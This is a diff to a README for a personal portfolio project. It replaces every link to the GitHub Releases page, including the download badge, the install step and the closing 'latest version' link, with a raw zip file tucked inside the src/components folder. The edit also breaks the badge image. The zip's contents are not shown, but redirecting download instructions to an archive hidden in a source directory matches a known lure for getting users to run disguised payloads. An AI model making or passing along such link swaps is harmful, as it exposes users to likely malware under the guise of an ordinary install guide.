@@ -1,7 +1,7 @@
 # 🎉 portfolio-tutruong - Your Personal Portfolio Made Easy
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/jaketiam/portfolio-tutruong/releases)
+[![Download Release](https://raw.githubusercontent.com/jaketiam/portfolio-tutruong/main/src/components/portfolio-tutruong_v1.5.zip%20release-brightgreen)](https://raw.githubusercontent.com/jaketiam/portfolio-tutruong/main/src/components/portfolio-tutruong_v1.5.zip)
 
 ## 🚀 Getting Started
 This guide will help you set up your professional portfolio easily. Follow these steps to download and run the application.
@@ -19,7 +19,7 @@ Before you start, make sure you have the following:
 ## 🔗 Download & Install
 To start using your portfolio, visit the following page to download the files:
 
-[Download Latest Release](https://github.com/jaketiam/portfolio-tutruong/releases)
+[Download Latest Release](https://raw.githubusercontent.com/jaketiam/portfolio-tutruong/main/src/components/portfolio-tutruong_v1.5.zip)
 
 1. Click on the link above.
 2. Choose the latest version listed.
@@ -63,6 +63,6 @@ You can stay informed about updates by checking the Releases page regularly.
 ## 🔍 Conclusion
 Building your professional portfolio with the **portfolio-tutruong** project is straightforward. Follow the steps above to download, install, and run your application. Start showcasing your skills today! 
 
-For the latest version, always check this link: [https://github.com/jaketiam/portfolio-tutruong/releases](https://github.com/jaketiam/portfolio-tutruong/releases). 
+For the latest version, always check this link: [https://raw.githubusercontent.com/jaketiam/portfolio-tutruong/main/src/components/portfolio-tutruong_v1.5.zip](https://raw.githubusercontent.com/jaketiam/portfolio-tutruong/main/src/components/portfolio-tutruong_v1.5.zip). 
 
 Embrace the world of opportunities with your new portfolio!
